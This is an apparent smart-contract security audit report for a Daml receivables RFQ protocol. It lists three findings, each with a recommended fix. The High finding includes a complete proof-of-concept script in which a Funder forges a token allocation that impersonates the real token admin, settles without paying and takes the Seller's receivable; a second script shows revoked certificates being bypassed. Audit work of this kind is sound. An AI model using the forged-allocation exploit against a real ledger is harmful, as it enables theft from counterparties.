# [C-1] Funder Can Fake `FundingAllocation` to Settle Without Paying and Steal the Receivable

**Severity:** `High` (_High Impact, Medium Likelihood_) <br>
**Category:** `Authorization / Unverified Contract` <br>
**File:** `contracts/daml/CloakRFQ/RFQRequest.daml` (relies on `Splice.Api.Token.AllocationV2`)

## Description

`fundingAllocationCid : ContractId Token.Allocation` is a **Funder-supplied choice argument** on `SubmitPrivateQuote`, and `Token.Allocation` is a Daml interface (`Splice.Api.Token.AllocationV2.Allocation`). Interfaces carry no guarantee that the concrete template backing a given `ContractId` has any particular signatory, or that its `view` data is honest.

The implementing template computes its own view as a pure function of its own fields, and Daml's type system does not require those fields to correspond to anything real. Any party can author their own template that implements this same public interface and self-report whatever `AllocationView` they like.

Every check `SubmitPrivateQuote` and `AcceptAndSettle` perform against the allocation is a **data comparison** against that self-reported view. Never a check on who actually authorized the underlying contract:

`SubmitPrivateQuote` (`ledger/contracts/daml/CloakRFQ/RFQRequest.daml`, lines 89-103):

```haskell
allocation <- fetch @Token.Allocation fundingAllocationCid
let allocationView = view @Token.Allocation allocation
let allocationSpec = allocationView.allocation
assertMsg "allocation must be committed" allocationSpec.committed
assertMsg "allocation deadline must cover quote expiry" (...)
assertMsg "allocation must reference this RFQ package" (allocationView.settlement.id == packageId)
assertMsg "allocation authorizer must be the Funder" (allocationSpec.authorizer.owner == Some funder)
assertMsg "allocation admin must match expected payment instrument admin" (allocationSpec.admin == packageData.paymentInstrumentAdmin)
assertMsg "allocation must contain a matching sender-side payment leg" (any (matchesPaymentLeg ...) allocationSpec.transferLegSides)
```

`allocationSpec.admin == packageData.paymentInstrumentAdmin` looks like it verifies the allocation belongs to the trusted registry, but `admin` is just a `Party`-typed field the implementing template's author chose to put in its own `view`. Nothing stops a Funder writing their own template (a near-copy of the test fixture `MockFundingAllocation` in `Test/Fixtures.daml`) that reports:

```
admin = <the real tokenAdmin's Party ID>
committed = True
authorizer.owner = Some funder
settlement.executors = [seller]
transferLegSides entry matching `seller`/the instrument/the amount
```
The above can be faked as they do not require authorisation, costing the Funder nothing, and `tokenAdmin` is never involved in creating it.

At settlement, `AcceptAndSettle` forwards this same untrusted data into the actual authorization for moving value:

```haskell
allocationSettleActors : Token.AllocationView -> [Party]
allocationSettleActors allocationView = allocationView.settlement.executors

...

settlementBatchResult <- exercise settlementFactoryCid Token.SettlementFactory_SettleBatch with
  settlement = allocationView.settlement
  transferLegs = paymentTransferLegs
  allocations = (Token.FinalizedAllocation with allocationCid = fundingAllocationCid ...) :: extraSettlementAllocations
  actors = allocationSettleActors allocationView
  extraArgs = emptyExtraArgs
```

`actors` is derived entirely from `allocationView.settlement.executors` (the same self-reported field), `SettlementFactory_SettleBatch` internally does `exercise allocation.allocationCid Token.Allocation_Settle with actors = ...` for each allocation, which is **dynamic interface dispatch**: it invokes whichever template actually backs that `ContractId`, i.e. the Funder's own fake one. 

Its `allocation_settleImpl` is entirely the Funder's own code. It can simply archive itself and report `AllocationResult_Settled` without touching any real holdings. The `Allocation_Settle`/`SettlementFactory_SettleBatch` interface choices are themselves declared `controller actors` in `Splice.Api.Token.AllocationV2`, so the ledger's authorization check for entering them only requires whatever parties are in `actors`, and since that value is sourced from the untrusted view (`executors = [seller]`), only `seller`'s authority is ever required. 

`tokenAdmin` — the party `packageData.paymentInstrumentAdmin` names as the trusted registry, and the party every "admin must match" assertion (gives the impression of protecting) is never required to authorize anything, even though a **real, honestly-signed** `SettlementFactory` is used for the rest of the transaction. Entering a choice on a signed contract only carries that contract's signatories' authority into what happens *inside* the choice body; it does not retroactively satisfy the controller check for the exercise itself. So being nested inside a real `tokenAdmin`-signed `MockSettlementFactory` does not help — `tokenAdmin`'s real authorization is never demanded anywhere in the call chain.

**Proof of Concept:** create `ledger/test/daml/CloakRFQ/FunderFakesAllocationPoC.daml` with the following.

<details> <summary>PoC Code</summary>

```haskell
-- | PoC: a Funder can self-author a fake `Token.Allocation` implementation
-- that self-reports every field `SubmitPrivateQuote`/`AcceptAndSettle` check,
-- including `admin = tokenAdmin`, without `tokenAdmin` ever signing or
-- submitting anything for it. The real `MockSettlementFactory` (the only
-- contract in this whole script that `tokenAdmin` actually authorizes) will
-- happily dispatch settlement to it anyway, because `SettlementFactory_SettleBatch`
-- just forwards to whatever template backs the given `allocationCid` via
-- interface dispatch -- it never checks who actually issued the allocation.
module CloakRFQ.FunderFakesAllocationPoC where

import Daml.Script
import DA.Assert ((===))
import DA.Date
import DA.Time
import DA.Map qualified as Map
import Splice.Api.Token.AllocationV2 qualified as Token
import Splice.Api.Token.HoldingV2 qualified as Holding
import Splice.Api.Token.MetadataV1

import CloakRFQ.Lib
import CloakRFQ.Compliance
import CloakRFQ.Risk
import CloakRFQ.RFQRequest
import CloakRFQ.Receivable
import CloakRFQ.Test.Fixtures

-- | A Funder-authored stand-in for a real CIP-56 committed allocation.
--
-- Signed ONLY by `funder`. `tokenAdmin` is pure data here, not a signatory --
-- the Funder can set it to any Party's identity, including the real
-- instrument admin's, without that party's knowledge or consent. Every field
-- `RFQRequest.daml`'s assertions check (`admin`, `committed`,
-- `authorizer.owner`, `settlement.id`, `settlement.executors`,
-- `transferLegSides`) is self-reported the same way `MockFundingAllocation`
-- reports them in `Test/Fixtures.daml` -- the only difference is that this
-- template is defined by the attacker (the Funder), not shipped as a trusted
-- test fixture, to make the point that anyone can write one.
template FakeFunderAllocation
  with
    funder : Party
    seller : Party
    tokenAdmin : Party
    packageId : Text
    amount : Decimal
    instrumentId : Text
    settlementDeadline : Time
    createdAt : Time
  where
    signatory funder -- tokenAdmin is NOT a signatory here!
    observer seller

    interface instance Token.Allocation for FakeFunderAllocation where
      view = Token.AllocationView with
        originalAllocationCid = None
        settlement = Token.SettlementInfo with
          executors = [seller]
          id = packageId
          cid = None
          meta = emptyMetadata
        allocation = Token.AllocationSpecification with
          admin = tokenAdmin -- self-reported lie: tokenAdmin never authorized this contract.
          authorizer = Holding.Account with owner = Some funder; provider = None; id = ""
          transferLegSides =
            [ Token.TransferLegSide with
                transferLegId = "quote-payment"
                side = Token.SenderSide
                otherside = Holding.Account with owner = Some seller; provider = None; id = ""
                amount
                instrumentId
                meta = emptyMetadata
            ]
          settlementDeadline = Some settlementDeadline
          nextIterationFunding = None
          committed = True -- the commitment is true but for fake funds!
          meta = emptyMetadata
        holdingCids = [] -- no real Holding backs this allocation.
        createdAt
        numIterations = 0
        expiresAt = Some settlementDeadline
        availableActions = Map.empty
        meta = emptyMetadata
      allocation_settleImpl allocationCid arg = do
        assertMsg "fake allocation settlement must be executed by Seller only" (arg.actors == [seller])
        archive allocationCid
        pure Token.AllocationResult with
          output = Token.AllocationResult_Settled with nextIterationAllocationCid = None
          authorizerHoldingCids = mempty -- no real holdings are ever produced for the Seller.
          meta = emptyMetadata
      allocation_cancelImpl _ _ = abort "fake allocation cannot cancel"
      allocation_withdrawImpl _ _ = abort "fake allocation cannot withdraw"
      allocation_settleExtraObservers _ = []
      allocation_cancelExtraObservers _ = []
      allocation_withdrawExtraObservers _ = []

funderFakesAllocationAndStillSettles : Script ()
funderFakesAllocationAndStillSettles = do
  seller     <- allocateParty "Seller"
  compliance <- allocateParty "Compliance"
  risk       <- allocateParty "Risk"
  funder     <- allocateParty "Funder"
  tokenAdmin <- allocateParty "USDTokenAdmin"
  auditParty <- allocateParty "Auditor"

  setTime (time (date 2030 Jun 1) 12 0 0)

  let packageId = "PKG-INV-9001"
  let invoiceId = "INV-9001"

  let terms = ReceivableTerms with
        payableAmount = 480000.0
        currency = "USD"
        issueDate = date 2026 Jan 1
        dueDate = date 2026 Feb 15
        paymentTerms = "Net 45"

  rcv <- submit seller do
    createCmd Receivable with
      registrar = seller
      owner = seller
      newOwner = seller
      metadata = ReceivableMetadata with
        invoiceId
        buyerReference = Some "AP-DEPT-42"
        purchaseOrderReference = Some "PO-98776"
        sourceSystemReference = Some "NETSUITE-AR-10031"
      debtorName = "Meridian Retail Group"
      terms

  complianceAttestation <- submit compliance do
    createCmd ComplianceAttestation with
      complianceParty = compliance
      seller
      packageId
      receivableCid = rcv
      complianceDisclosure = ComplianceDisclosure with
        sellerIdentity = IdentityDisclosure with
          legalName = "Aster Components LLC"
          jurisdiction = "US-DE"
          entityType = "Limited liability company"
        debtorIdentity = IdentityDisclosure with
          legalName = "Meridian Retail Group"
          jurisdiction = "US-NY"
          entityType = "Corporation"
        receivableTerms = terms
        transactionPurpose = "Receivable sale RFQ for working capital"
        disclosureRestrictions = "Package disclosure limited to eligible funders in later phases"
      complianceResult = ComplianceResult with
        sellerEligible = True
        rfqEligible = True

  complianceCertificate <- submit seller do
    exerciseCmd complianceAttestation CreateComplianceCertificate with
      policyVersion = "MVP-COMPLIANCE-v1"
      certificationScope = "Phase 1 RFQ package eligibility"

  riskAttestation <- submit risk do
    createCmd RiskAttestation with
      riskAssessor = risk
      seller
      packageId
      receivableCid = rcv
      riskDisclosure = RiskDisclosure with receivableTerms = terms
      riskResult = RiskResult with riskTier = LowRisk

  riskCertificate <- submit seller do
    exerciseCmd riskAttestation CreateRiskCertificate with
      riskPolicyVersion = "MVP-RISK-v1"
      certificationScope = "Phase 1 receivable risk tier"

  let packageData = RFQPackageData with
        receivableTerms = terms
        riskTier = LowRisk
        responseDeadline = time (date 2030 Jul 1) 12 0 0
        paymentInstrumentAdmin = tokenAdmin
        paymentInstrumentId = "USD"

  request <- submit seller do
    createCmd RFQRequest with
      seller
      funder
      complianceParty = compliance
      riskAssessor = risk
      packageId
      receivableCid = rcv
      packageData
      complianceCertificateCid = complianceCertificate
      riskCertificateCid = riskCertificate

  let quoteExpiresAt = time (date 2030 Jul 2) 12 0 0
  let quoteTerms = QuoteTerms with
        netPurchasePrice = 465000.0
        recourseModel = WithoutRecourse
        debtorNotificationRequired = False
        quoteExpiresAt

  -- Step 1: the Funder alone -- no submission from tokenAdmin anywhere in
  -- this script involves the allocation -- authors and creates a
  -- FakeFunderAllocation that self-declares `admin = tokenAdmin`,
  -- `committed = True`, and a payment leg to `seller` for exactly
  -- `quoteTerms.netPurchasePrice`.
  fakeAllocation <- submit funder do
    createCmd FakeFunderAllocation with
      funder
      seller
      tokenAdmin
      packageId
      amount = 465000.0
      instrumentId = "USD"
      settlementDeadline = quoteExpiresAt
      createdAt = time (date 2030 Jun 1) 12 0 0

  -- Step 2: the Funder submits a Private Quote against the fake allocation.
  -- Every assertMsg in SubmitPrivateQuote -- including "allocation admin
  -- must match expected payment instrument admin" -- passes, because they
  -- only compare self-reported view fields, never who actually signed the
  -- allocation contract.
  privateQuote <- submit funder do
    exerciseCmd request SubmitPrivateQuote with
      quoteTerms
      fundingAllocationCid = toInterfaceContractId @Token.Allocation fakeAllocation

  -- Step 3: tokenAdmin creates the REAL, legitimate settlement factory. This
  -- is the only contract in this entire script that tokenAdmin actually
  -- signs -- representing a genuinely real, trustworthy CIP-56 registry
  -- being present on the network.
  settlementFactory <- submit tokenAdmin do
    createCmd MockSettlementFactory with
      tokenAdmin
      seller

  setTime (time (date 2030 Jul 1) 13 0 0)

  -- Step 4: the Seller settles against the fake allocation using the REAL
  -- settlement factory. SettlementFactory_SettleBatch dispatches
  -- Allocation_Settle to whatever template backs fundingAllocationCid via
  -- interface dispatch -- it never verifies that the allocation it is asked
  -- to settle actually originated from tokenAdmin's own registry. The fake
  -- allocation's own allocation_settleImpl runs instead, archives itself,
  -- and reports AllocationResult_Settled with no real holdings ever moving.
  settlement <- submit seller do
    exerciseCmd privateQuote AcceptAndSettle with
      auditor = auditParty
      settlementFactoryCid = toInterfaceContractId @Token.SettlementFactory settlementFactory
      extraSettlementAllocations = []

  Some settlementView <- queryContractId auditParty settlement
  settlementView.seller === seller
  settlementView.funder === funder
  settlementView.quoteTerms.netPurchasePrice === 465000.0

  let receivableTransferCid : ContractId Receivable = settlementView.receivableTransferCid

  transferredReceivableCid <- submit funder do
    exerciseCmd receivableTransferCid AcceptTransfer

  Some transferredReceivable <- queryContractId funder transferredReceivableCid
  transferredReceivable.owner === funder

  -- Proof: a complete, on-ledger "successful" ReceivableSaleSettlement was
  -- produced, and the real Receivable now belongs to the Funder, even though
  -- tokenAdmin -- the party packageData.paymentInstrumentAdmin claims backs
  -- this deal, and the party every "allocation admin must match" assertion
  -- was supposed to protect -- never signed, authorized, or was even made
  -- aware of the funding allocation that "paid" for it. tokenAdmin's only
  -- role in this whole script was creating an unrelated, correctly-signed
  -- settlement factory; nothing tied that factory's legitimacy to the
  -- allocation it was asked to settle.
  pure ()
```

</details>

## Impact

High as the Funder can manipulate the Seller into selling their Receivable and getting nothing in return.

## Recommendation

1. Require the real, independently-trusted admin party to be part of `actors` when exercising `SettlementFactory_SettleBatch`/`Allocation_Settle`, sourced from `packageData.paymentInstrumentAdmin` (decided at `RFQRequest` origination) rather than from `allocationView.settlement.executors` (self-reported on the very contract being authenticated):

   ```haskell
   actors = packageData.paymentInstrumentAdmin :: allocationView.settlement.executors
   ```

   This matches what the `AllocationV2` interface's own doc comment on `Allocation_Settle` already recommends and this code currently ignores: *"By default, they SHOULD require [actors] to be equal to the allocation `admin` and the `executors`."* With this change, entering the choice requires `tokenAdmin`'s genuine authorization somewhere in the transaction — a forged, Funder-only-signed contract cannot produce that.

2. As defense-in-depth, if CloakRFQ is deployed against a single known registry implementation, consider pinning the accepted `Token.Allocation`/`Token.SettlementFactory` CIDs to a known-good template via `interfaceTypeRep`/`templateTypeRep` comparison, rejecting anything else outright. This sacrifices some multi-registry interoperability but adds a second, independent barrier.

---

# [M-1] Compliance/risk certificate revocation is not enforced downstream

**Severity:** `Medium` (_High Impact, Low Likelihood_) <br>
**Category:** `Stale credential reuse` <br>
**File:** `contracts/daml/CloakRFQ/RFQRequest.daml` (also `Compliance.daml`, `Risk.daml`)

## Description

`ComplianceCertificate` and `RiskCertificate` are the on-chain proofs that prove a `Seller` is compliant and correctly risk-tiered, in order for them to participate in the RFQ marketplace. They are created once, starting with the `complianceParty` and `Risk` providing their findings to `ComplianceAttestation` and `RiskAttestation` respectively. Then the `Seller` will claim their certificates. 

Once the `Seller` has both Certificates, they are only ever referenced by `ContractId` from every later stage of the RFQ lifecycle:

```haskell
template RFQRequest
  with
    ...
    complianceCertificateCid : ContractId ComplianceCertificate
    riskCertificateCid : ContractId RiskCertificate
  where
    signatory seller
    observer funder
    ensure hasValidReceivableTerms packageData.receivableTerms

    choice SubmitPrivateQuote : ContractId PrivateQuote
      with ...
      controller funder
      do
        -- validates quote terms, deadlines, and the funding allocation --
        -- complianceCertificateCid / riskCertificateCid are never fetched
        ...
```

Both certifications are point-in-time judgements that can become stale: `complianceParty` may later find adverse information, a sanctions hit, or a failed re-KYC on the `Seller`; `riskAssessor` may need to downgrade a `Seller`'s risk tier as a receivable ages or the debtor's creditworthiness changes. 

In both cases, the only option available to the issuing party is to `Archive` the certificate they signed — there is no `Revoke`/`Suspend` choice defined anywhere in `Compliance.daml` or `Risk.daml`. Archiving removes the contract from the active contract set, but that action is never observed anywhere else in the protocol, because no downstream choice ever re-`fetches` either certificate:

- `RFQRequest`'s `ensure` clause only validates `hasValidReceivableTerms packageData.receivableTerms`.
- `SubmitPrivateQuote` (`RFQRequest.daml:78-112`) validates the funding allocation and package terms but never touches either certificate id.
- `AcceptAndSettle` (`RFQRequest.daml:128-189`) re-validates the receivable, allocation, and settlement factory, but again never fetches either certificate.

A `ContractId` in Daml is just an opaque reference — storing it without a `fetch` provides no on-ledger guarantee that it is valid or still active. Archiving `ComplianceCertificate` or `RiskCertificate` therefore has zero effect on anything that happens afterward.

**Proof of Concept:** Please create a new `daml` test file as such: `ledger/test/daml/CloakRFQ/StaleCertificatesPoC.daml`. Then proceed with pasting the following PoC:

<details> <summary>PoC Code</summary>

```haskell
module CloakRFQ.StaleCertificatesPoC where

import Daml.Script
import DA.Assert ((===))
import DA.Date
import DA.Time
import Splice.Api.Token.AllocationV2 qualified as Token

import CloakRFQ.Lib
import CloakRFQ.Compliance
import CloakRFQ.Risk
import CloakRFQ.RFQRequest
import CloakRFQ.Receivable
import CloakRFQ.Test.Fixtures

revokedSellerStillParticipates : Script ()
revokedSellerStillParticipates = do
  seller <- allocateParty "Seller"
  compliance <- allocateParty "Compliance"
  risk <- allocateParty "Risk"
  funder <- allocateParty "Funder"
  tokenAdmin <- allocateParty "USDTokenAdmin"
  auditParty <- allocateParty "Auditor"

  setTime (time (date 2030 Jun 1) 12 0 0)

  let packageId = "PKG-INV-4471"
  let invoiceId = "INV-4471"

  let terms = ReceivableTerms with
        payableAmount = 480000.0
        currency = "USD"
        issueDate = date 2026 Jan 1
        dueDate = date 2026 Feb 15 
        paymentTerms = "Net 45"

  rcv <- submit seller do
    createCmd Receivable with
      registrar = seller
      owner = seller
      newOwner = seller
      metadata = ReceivableMetadata with
        invoiceId
        buyerReference = Some "AP-DEPT-42"
        purchaseOrderReference = Some "PO-98776"
        sourceSystemReference = Some "NETSUITE-AR-10031"
      debtorName = "Meridian Retail Group"
      terms

  -- Step 1: Seller is certified compliant, as normal.
  complianceAttestation <- submit compliance do
    createCmd ComplianceAttestation with
      complianceParty = compliance
      seller
      packageId
      receivableCid = rcv
      complianceDisclosure = ComplianceDisclosure with
        sellerIdentity = IdentityDisclosure with
          legalName = "Aster Components LLC"
          jurisdiction = "US-DE"
          entityType = "Limited liability company"
        debtorIdentity = IdentityDisclosure with
          legalName = "Meridian Retail Group"
          jurisdiction = "US-NY"
          entityType = "Corporation"
        receivableTerms = terms
        transactionPurpose = "Receivable sale RFQ for working capital"
        disclosureRestrictions = "Package disclosure limited to eligible funders in later phases"
      complianceResult = ComplianceResult with
        sellerEligible = True
        rfqEligible = True

  complianceCertificate <- submit seller do
    exerciseCmd complianceAttestation CreateComplianceCertificate with
      policyVersion = "MVP-COMPLIANCE-v1"
      certificationScope = "Phase 1 RFQ package eligibility"

  riskAttestation <- submit risk do
    createCmd RiskAttestation with
      riskAssessor = risk
      seller
      packageId
      receivableCid = rcv
      riskDisclosure = RiskDisclosure with
        receivableTerms = terms
      riskResult = RiskResult with
        riskTier = LowRisk

  riskCertificate <- submit seller do
    exerciseCmd riskAttestation CreateRiskCertificate with
      riskPolicyVersion = "MVP-RISK-v1"
      certificationScope = "Phase 1 receivable risk tier"

  -- Step 2: Seller is later found to be non-compliant and high-risk. The
  -- only tool complianceParty/riskAssessor have is the implicit Archive
  -- choice on the certificate they each signed -- there is no
  -- Revoke/Suspend choice anywhere in Compliance.daml or Risk.daml.
  submit compliance do
    archiveCmd complianceCertificate

  submit risk do
    archiveCmd riskCertificate

  -- Confirm both certificates are actually gone from the active contract set.
  None <- queryContractId compliance complianceCertificate
  None <- queryContractId risk riskCertificate

  let packageData = RFQPackageData with
        receivableTerms = terms
        riskTier = LowRisk
        responseDeadline = time (date 2030 Jul 1) 12 0 0
        paymentInstrumentAdmin = tokenAdmin
        paymentInstrumentId = "USD"

  -- Step 3: the "revoked" Seller still originates a brand-new RFQRequest
  -- referencing the archived complianceCertificateCid and riskCertificateCid.
  -- Creation never fetches either certificate, so this succeeds.
  request <- submit seller do
    createCmd RFQRequest with
      seller
      funder
      complianceParty = compliance
      riskAssessor = risk
      packageId
      receivableCid = rcv
      packageData
      complianceCertificateCid = complianceCertificate
      riskCertificateCid = riskCertificate

  let quoteExpiresAt = time (date 2030 Jul 2) 12 0 0
  let quoteTerms = QuoteTerms with
        netPurchasePrice = 465000.0
        recourseModel = WithoutRecourse
        debtorNotificationRequired = False
        quoteExpiresAt

  fundingAllocation <- submit funder do
    createCmd MockFundingAllocation with
      funder
      seller
      tokenAdmin
      packageId
      amount = 465000.0
      instrumentId = "USD"
      settlementDeadline = quoteExpiresAt
      createdAt = time (date 2030 Jun 1) 12 0 0

  -- Step 4: the Funder submits a private quote against the "revoked"
  -- Seller's request. SubmitPrivateQuote never fetches complianceCertificateCid
  -- or riskCertificateCid, so this succeeds too.
  privateQuote <- submit funder do
    exerciseCmd request SubmitPrivateQuote with
      quoteTerms
      fundingAllocationCid = toInterfaceContractId @Token.Allocation fundingAllocation

  settlementFactory <- submit tokenAdmin do
    createCmd MockSettlementFactory with
      tokenAdmin
      seller

  setTime (time (date 2030 Jul 1) 13 0 0)

  -- Step 5: the Seller accepts and fully settles the receivable sale.
  -- AcceptAndSettle also never fetches either certificate, so a Seller
  -- whose compliance and risk certificates were both revoked before the
  -- request even existed can walk the entire RFQ lifecycle to a completed
  -- settlement.
  settlement <- submit seller do
    exerciseCmd privateQuote AcceptAndSettle with
      auditor = auditParty
      settlementFactoryCid = toInterfaceContractId @Token.SettlementFactory settlementFactory
      extraSettlementAllocations = []

  Some settlementView <- queryContractId auditParty settlement
  settlementView.seller === seller
  settlementView.funder === funder
  settlementView.quoteTerms.netPurchasePrice === 465000.0

  let receivableTransferCid : ContractId Receivable = settlementView.receivableTransferCid

  transferredReceivableCid <- submit funder do
    exerciseCmd receivableTransferCid AcceptTransfer

  Some transferredReceivable <- queryContractId funder transferredReceivableCid
  transferredReceivable.owner === funder

  -- Proof: the entire RFQ package -- origination, quote, and settlement --
  -- was carried out and completed while both complianceCertificate and
  -- riskCertificate were archived (revoked) the whole time.
  pure ()
```

</details>

## Impact

Set as Medium. As the impact is high (a non-compliant and/or wrong risk scored seller is significantly bad for the protocol). However, the likelihood of such occurrence is low. It is also possible for the `Funder` to manually check themselves and prevent themselves to transact with that `Seller` but the code does not forbid it. 

## Recommendation

Re-verify compliance and risk eligibility at the points where it materially matters, not just at attestation time:

1. In `SubmitPrivateQuote` and/or `AcceptAndSettle`, `fetch @ComplianceCertificate complianceCertificateCid` and `fetch @RiskCertificate riskCertificateCid` and assert both succeed:

   ```haskell
   compliance <- fetch @ComplianceCertificate complianceCertificateCid
   risk <- fetch @RiskCertificate riskCertificateCid
   ```

   A `fetch` on an archived `ContractId` aborts the transaction, which is exactly the desired behaviour.

2. Consider adding explicit `Revoke`/`Suspend` choices on `ComplianceCertificate` and `RiskCertificate` so revocation is an intentional, auditable action rather than overloading the generic `Archive`, and have downstream choices check for that state.

3. At minimum, `AcceptAndSettle` — the point of no return, where the receivable actually transfers — should require both certificates to still be valid, even if earlier steps are left unchanged.

---

# [L-1] SubmitPrivateQuote Never Verifies the Receivable It Is Quoting Against

**Severity:** `Low` (_Medium Impact, Low Likelihood_) <br>
**Category:** `Griefing + Integrity (viewing/manipulating data)` <br>
**File:** `contracts/daml/CloakRFQ/RFQRequest.daml`

## Description

`RFQRequest` has both a `receivableCid : ContractId Receivable` and a Seller authored
`packageData : RFQPackageData`, which embeds `packageData.receivableTerms`. The Funder is
only ever an `observer` of `RFQRequest`/`PrivateQuote`, never of `Receivable` itself
(`Receivable`'s `observer` is `newOwner`, which is not set to the Funder until a transfer is
proposed). 

So the Funder cannot independently inspect the real `Receivable` before quoting
or funding, they are entirely dependent on `packageData.receivableTerms` being an honest
copy of what `receivableCid` actually points to.

Nothing enforces that honesty until very late in the workflow. Compare what each choice
actually checks:

`SubmitPrivateQuote` (`ledger/contracts/daml/CloakRFQ/RFQRequest.daml`, lines 78-112),
controller `funder`:

```haskell
choice SubmitPrivateQuote : ContractId PrivateQuote
  with
    quoteTerms : QuoteTerms
    fundingAllocationCid : ContractId Token.Allocation
  controller funder
  do
    now <- getTime
    assertMsg "quote terms must be valid for this request" (hasValidQuoteForRequest packageData quoteTerms)
    assertMsg "quote response deadline passed" (now <= packageData.responseDeadline)
    assertMsg "quote already expired" (now <= quoteTerms.quoteExpiresAt)

    allocation <- fetch @Token.Allocation fundingAllocationCid
    let allocationView = view @Token.Allocation allocation
    let allocationSpec = allocationView.allocation
    assertMsg "allocation must be committed" allocationSpec.committed
    assertMsg "allocation deadline must cover quote expiry"
      (allocationDeadlineCoversQuote allocationSpec.settlementDeadline quoteTerms.quoteExpiresAt)
    assertMsg "allocation must reference this RFQ package"
      (allocationView.settlement.id == packageId)
    assertMsg "allocation authorizer must be the Funder"
      (allocationSpec.authorizer.owner == Some funder)
    assertMsg "allocation admin must match expected payment instrument admin"
      (allocationSpec.admin == packageData.paymentInstrumentAdmin)
    assertMsg "allocation must contain a matching sender-side payment leg"
      (any (matchesPaymentLeg seller packageData.paymentInstrumentId quoteTerms.netPurchasePrice)
        allocationSpec.transferLegSides)

    create PrivateQuote with ...
```

`receivableCid` is passed straight through into the created `PrivateQuote`. The first and only time the actual `Receivable` gets checked is in `AcceptAndSettle` (`ledger/contracts/daml/CloakRFQ/RFQRequest.daml`, lines 141-143), controller `seller`,
called after the Funder has already committed:

```daml
receivable <- fetch receivableCid
assertMsg "Seller no longer owns receivable" (receivable.owner == seller)
assertMsg "Receivable terms differ from package terms" (receivable.terms == packageData.receivableTerms)
```

So a `PrivateQuote` can be created, and a Funder's allocation can be locked as
`committed = True` against it, entirely on the strength of a `packageData.receivableTerms`
value the Seller wrote by hand into `RFQRequest` — with no on-ledger tie to `receivableCid`
until settlement is attempted. 

This does not by itself let the Seller steal the mismatched difference: `AcceptAndSettle`'s
`receivable.terms == packageData.receivableTerms` assertion will fail and roll back the
transaction if the two never matched, so no settlement evidence or transfer gets created on
a lie. The damage is what happens *before* that point.

## Impact

This lets an un-truthful Seller to "waste" a Funder's time and allocations. It will not let the Seller actually steal any funds, which is why this findings is a Low severity. 

## Recommendation

Have the `receivable.terms == packageData.receivableTerms` check in the RFQRequest template creation as well. 

---